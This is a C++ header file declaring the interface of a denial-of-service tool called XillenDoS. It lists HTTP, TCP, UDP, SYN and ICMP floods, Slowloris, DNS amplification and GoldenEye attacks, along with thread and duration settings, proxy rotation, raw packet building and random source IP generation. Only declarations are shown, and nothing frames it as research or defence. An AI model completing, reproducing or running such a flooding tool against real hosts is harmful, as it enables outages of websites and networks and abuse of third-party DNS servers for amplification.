#pragma once

#include <iostream>
#include <string>
#include <vector>
#include <thread>
#include <atomic>
#include <chrono>
#include <random>
#include <memory>
#include <mutex>
#include <condition_variable>
#include <queue>
#include <map>
#include <unordered_map>
#include <fstream>
#include <sstream>
#include <algorithm>
#include <functional>
#include <future>
#include <exception>

#ifdef _WIN32
    #include <winsock2.h>
    #include <ws2tcpip.h>
    #include <windows.h>
    #include <iphlpapi.h>
    #pragma comment(lib, "ws2_32.lib")
    #pragma comment(lib, "iphlpapi.lib")
#else
    #include <sys/socket.h>
    #include <netinet/in.h>
    #include <arpa/inet.h>
    #include <netdb.h>
    #include <unistd.h>
    #include <fcntl.h>
    #include <sys/select.h>
    #include <sys/time.h>
    #include <signal.h>
#endif

namespace XillenDoS {
    
    enum class AttackType {
        HTTP_FLOOD,
        TCP_FLOOD,
        UDP_FLOOD,
        SYN_FLOOD,
        ICMP_FLOOD,
        SLOWLORIS,
        DNS_AMPLIFICATION,
        HTTP_POST_FLOOD,
        GOLDENEYE,
        MIXED_ATTACK,
        HTTP_FLOOD_ADVANCED,
        TCP_FLOOD_ADVANCED,
        UDP_FLOOD_ADVANCED,
        SYN_FLOOD_ADVANCED,
        ICMP_FLOOD_ADVANCED
    };

    struct AttackConfig {
        std::string target;
        std::string target_ip;
        int port = 80;
        int threads = 100;
        int duration = 60;
        AttackType method = AttackType::HTTP_FLOOD;
        bool use_proxy = false;
        std::vector<std::string> proxies;
        bool verbose = false;
        std::string log_file = "xillen_dos.log";
    };

    struct AttackStats {
        std::atomic<uint64_t> requests_sent{0};
        std::atomic<uint64_t> errors{0};
        std::atomic<uint64_t> successful_connections{0};
        std::atomic<uint64_t> bytes_sent{0};
        std::atomic<uint64_t> packets_sent{0};
        std::chrono::steady_clock::time_point start_time;
        std::chrono::steady_clock::time_point end_time;
        std::string attack_method;
        std::string target;
        
        void reset() {
            requests_sent = 0;
            errors = 0;
            successful_connections = 0;
            bytes_sent = 0;
            packets_sent = 0;
            start_time = std::chrono::steady_clock::now();
        }
        
        double get_rps() const {
            auto now = std::chrono::steady_clock::now();
            auto elapsed = std::chrono::duration_cast<std::chrono::milliseconds>(now - start_time).count();
            return elapsed > 0 ? (double)requests_sent.load() / (elapsed / 1000.0) : 0.0;
        }
        
        double get_uptime() const {
            auto now = std::chrono::steady_clock::now();
            return std::chrono::duration_cast<std::chrono::milliseconds>(now - start_time).count() / 1000.0;
        }
    };

    class Logger {
    private:
        std::ofstream log_file;
        std::mutex log_mutex;
        bool verbose_mode;
        
    public:
        Logger(const std::string& filename = "xillen_dos.log", bool verbose = false);
        ~Logger();
        
        void info(const std::string& message);
        void warning(const std::string& message);
        void error(const std::string& message);
        void success(const std::string& message);
        void debug(const std::string& message);
    };

    class NetworkUtils {
    public:
        static std::string resolve_domain(const std::string& domain);
        static bool is_valid_ip(const std::string& ip);
        static std::string get_local_ip();
        static bool check_port_open(const std::string& host, int port, int timeout = 3);
        static std::vector<std::string> get_dns_servers();
    };

    class ProxyManager {
    private:
        std::vector<std::string> proxies;
        std::atomic<size_t> current_proxy{0};
        std::mutex proxy_mutex;
        
    public:
        bool load_proxies(const std::string& file_path);
        std::string get_next_proxy();
        size_t get_proxy_count() const;
    };

    class PacketBuilder {
    public:
        static std::vector<uint8_t> create_tcp_packet(
            const std::string& src_ip, const std::string& dst_ip,
            uint16_t src_port, uint16_t dst_port,
            uint32_t seq_num, uint32_t ack_num,
            uint8_t flags, const std::vector<uint8_t>& data = {}
        );
        
        static std::vector<uint8_t> create_udp_packet(
            const std::string& src_ip, const std::string& dst_ip,
            uint16_t src_port, uint16_t dst_port,
            const std::vector<uint8_t>& data
        );
        
        static std::vector<uint8_t> create_icmp_packet(
            const std::string& src_ip, const std::string& dst_ip,
            uint8_t type, uint8_t code, const std::vector<uint8_t>& data
        );
        
        static std::vector<uint8_t> create_dns_query(
            const std::string& domain, uint16_t query_id
        );
        
        static std::vector<uint8_t> create_http_request(
            const std::string& method, const std::string& path,
            const std::string& host, const std::string& user_agent,
            const std::map<std::string, std::string>& headers = {}
        );
    };

    class XillenDoS {
    private:
        AttackConfig config;
        AttackStats stats;
        Logger logger;
        ProxyManager proxy_manager;
        
        std::atomic<bool> running{false};
        std::vector<std::thread> worker_threads;
        std::vector<std::string> user_agents;
        std::vector<std::string> attack_paths;
        std::vector<std::string> http_methods;
        
        std::random_device rd;
        std::mt19937 gen;
        std::uniform_int_distribution<> dis;
        
        void initialize_user_agents();
        void initialize_attack_paths();
        void initialize_http_methods();
        
        void http_flood_worker();
        void tcp_flood_worker();
        void udp_flood_worker();
        void syn_flood_worker();
        void icmp_flood_worker();
        void slowloris_worker();
        void dns_amplification_worker();
        void http_post_flood_worker();
        void goldeneye_worker();
        void mixed_attack_worker();
        
        void http_flood_advanced_worker();
        void tcp_flood_advanced_worker();
        void udp_flood_advanced_worker();
        void syn_flood_advanced_worker();
        void icmp_flood_advanced_worker();
        
        void stats_thread();
        void display_banner();
        void display_menu();
        void get_target_info();
        void start_attack();
        
        std::string get_random_user_agent();
        std::string get_random_path();
        std::string get_random_http_method();
        std::string generate_random_ip();
        
        void setup_socket_options(int sockfd);
        void send_raw_packet(const std::vector<uint8_t>& packet, const std::string& target_ip);
        
    public:
        XillenDoS();
        ~XillenDoS();
        
        void run();
        void set_config(const AttackConfig& new_config);
        AttackStats get_stats() const;
        void stop_attack();
    };

    class Colors {
    public:
        static const std::string RED;
        static const std::string GREEN;
        static const std::string YELLOW;
        static const std::string BLUE;
        static const std::string MAGENTA;
        static const std::string CYAN;
        static const std::string WHITE;
        static const std::string BOLD;
        static const std::string UNDERLINE;
        static const std::string END;
    };

    void print_banner();
    void print_menu();
    std::string get_attack_type_name(AttackType type);
    AttackType parse_attack_type(int choice);
}
